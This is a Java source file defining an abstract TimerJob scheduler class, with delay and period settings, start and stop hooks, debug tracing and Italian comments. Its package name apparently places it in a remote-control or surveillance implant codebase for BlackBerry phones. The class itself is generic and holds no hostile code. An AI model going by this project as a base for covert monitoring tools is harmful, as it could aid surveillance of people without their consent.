package com.ht.rcs.blackberry.threadpool;

import java.util.Timer;
import java.util.TimerTask;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public abstract class TimerJob extends TimerTask {

    protected static final long SOON = 0;

    protected static final long NEVER = Integer.MAX_VALUE;

    //#mdebug
    private static Debug debug = new Debug("TimerJob", DebugLevel.VERBOSE);
    //#enddebug

    protected boolean running = false;
    protected boolean enabled = false;

    protected boolean stopped;
    protected boolean scheduled;

    private int runningLoops = 0;
    protected String name;

    /* private boolean enqueued; */
    //private static int numThreads = 0;

    private long wantedPeriod;
    private long wantedDelay;

    public TimerJob(String name_) {
        this.name = name_;

        this.wantedPeriod = NEVER;
        this.wantedDelay = SOON;

        this.stopped = true;

        //#ifdef DBC
        Check.requires(wantedPeriod >= 0, "Every has to be >=0");
        Check.requires(wantedDelay >= SOON, "Every has to be >=0");
        //#endif
    }

    public TimerJob(String name, long delay_, long period_) {
        this(name);
        setPeriod(period_);
        setDelay(delay_);
    }

    protected void setPeriod(long period_) {
        if (period_ < 0) {
            debug.error("negative period");
            this.wantedPeriod = 0;
        } else {
            this.wantedPeriod = period_;
        }
        //#debug
        debug.trace("setPeriod: " + wantedPeriod);
    }

    protected void setDelay(long delay_) {
        if (delay_ < 0) {
            debug.error("negative delay");
            this.wantedDelay = 0;
        } else {

            this.wantedDelay = delay_;
        }
        //#debug
        debug.trace("setDelay: " + wantedDelay);
    }

    public long getPeriod() {
        return wantedPeriod;
    }

    public long getDelay() {
        return wantedDelay;
    }

    /**
     * Ogni volta che il timer richiede l'esecuzione del task viene invocato
     * questo metodo.
     */
    protected abstract void actualRun();

    /**
     * La prima volta che viene lanciata l'esecuzione del task, oppure dopo una
     * stop, viene chiamato questo metodo, prima della actualRun. Serve per
     * inizializzare l'ambiente, aprire i file e le connessioni.
     */
    protected void actualStart() {

    }

    /**
     * Questo metodo viene invocato alla stop. Si usa per chiudere i file aperti
     * nella actualStart
     */
    protected void actualStop() {

    }

    public void addToTimer(Timer timer) {
        //#debug
        debug.trace("adding timer");
        timer.schedule(this, getDelay(), getPeriod());
        scheduled = true;
    }

    /**
     * Checks if is running.
     * 
     * @return true, if is running
     */
    public synchronized boolean isRunning() {

        return !stopped;

    }

    public synchronized boolean isScheduled() {

        return scheduled;

    }

    public synchronized void run() {
        // #debug
        debug.info("Run " + this);

        if (stopped) {
            stopped = false;
            actualStart();
        }

        runningLoops++;

        try {
            // #debug
            debug.trace("actualRun " + this);
            running = true;
            actualRun();
        } finally {
            running = false;
        }

        // #debug
        debug.info("End " + this);
    }

    /**
     *Stop.
     */
    public final synchronized void stop() {
        // #debug
        debug.info("Stopping... " + this);

        stopped = true;
        cancel();
        scheduled = false;
        actualStop();
    }

    public boolean isEnabled() {
        return enabled;
    }

    public void enable(boolean enabled_) {
        enabled = enabled_;
    }

    public int getRunningLoops() {

        return runningLoops;
    }

    public String toString() {
        return name + " D,T:" + wantedDelay + "," + wantedPeriod;
    }

    public void restart() {
        //if (isOneshot()) {
            run();
        //}
    }

    private boolean isOneshot() {
        return wantedPeriod == NEVER;
    }

}